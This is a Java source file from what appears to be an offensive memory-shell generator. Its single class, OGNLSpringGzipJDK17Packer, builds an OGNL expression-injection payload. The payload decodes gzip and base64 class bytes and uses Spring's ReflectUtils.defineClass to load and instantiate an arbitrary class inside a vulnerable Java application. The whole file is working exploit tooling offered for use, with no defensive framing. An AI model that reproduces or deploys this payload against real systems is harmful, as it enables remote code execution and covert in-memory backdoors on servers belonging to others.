package org.leo.jmg.mem.packer.ognl;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

import static org.leo.jmg.mem.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

@PackerMeta(name = "OGNLSpringGzipJDK17", group = "Ognl", order = 3)
public class OGNLSpringGzipJDK17Packer implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.StreamUtils@copyToByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),new java.net.URLClassLoader(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()),null,@java.lang.Class@forName('org.springframework.expression.ExpressionParser'))).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", PackerRegistry.getOrThrow("GzipBase64").pack(config));
    }
}
